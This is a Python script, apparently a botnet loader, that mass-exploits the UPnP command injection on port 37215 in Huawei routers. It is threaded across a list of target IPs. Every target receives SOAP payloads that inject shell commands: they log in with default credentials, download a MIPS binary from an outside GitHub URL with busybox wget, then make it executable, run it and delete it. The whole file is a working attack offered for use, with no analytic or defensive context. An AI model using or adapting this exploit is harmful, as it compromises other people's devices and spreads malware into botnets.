import threading, sys, time, requests
from threading import Thread
from requests.auth import HTTPDigestAuth

ips = open(sys.argv[1], "r").readlines()

cmd1 = "/bin/busybox wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips"
cmd2 = "chmod 777 mips;./mips;rm -rf mips"

payload1 = "<?xml version=\"1.0\" ?>\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n    <NewStatusURL>$(" + cmd1 + ")</NewStatusURL>\n<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n</u:Upgrade>\n    </s:Body>\n    </s:Envelope>"
payload2 = "<?xml version=\"1.0\" ?>\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n    <NewStatusURL>$(" + cmd2 + ")</NewStatusURL>\n<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n</u:Upgrade>\n    </s:Body>\n    </s:Envelope>"

class rtek(threading.Thread):
    def __init__(self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip).strip()

    def run(self):
        try:
            print("[Huawei] Loading - " + self.ip)
            url = "http://" + self.ip + ":37215/ctrlt/DeviceUpgrade_1"
            requests.post(url, timeout=3, data=payload1, auth=HTTPDigestAuth('dslf-config', 'admin'))
            requests.post(url, timeout=2.5, data=payload2, auth=HTTPDigestAuth('dslf-config', 'admin'))
        except Exception:
            pass

threads = []
for ip in ips:
    try:
        n = rtek(ip)
        threads.append(n)
        n.start()
        time.sleep(0.03)

        if len(threads) >= 1024:
            for t in threads:
                t.join()
            threads.clear()
            
    except Exception:
        pass

for t in threads:
    t.join()
